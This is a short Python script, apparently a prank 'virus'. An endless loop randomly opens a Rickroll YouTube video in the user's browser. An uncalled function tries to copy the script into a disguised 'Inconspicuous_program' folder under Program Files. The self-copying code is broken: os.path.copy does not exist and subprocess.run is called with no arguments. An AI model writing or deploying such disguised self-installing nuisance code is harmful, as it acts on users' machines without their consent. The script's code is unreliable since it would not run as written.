import webbrowser
import time
import random
import os
import subprocess as subp

def creator():
    dir = os.path.join("C:\\", "Program Files", "Inconspicuous_program")
    if not os.path.isdir(dir):
        os.mkdir(dir)
        if os.path.copy(os.getcwd(), os.path.join(dir, "Inconspicuous_virus.py")):
            subp.run()

    

while True:
    time.sleep(10)
    if random.random() < 0.05:
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
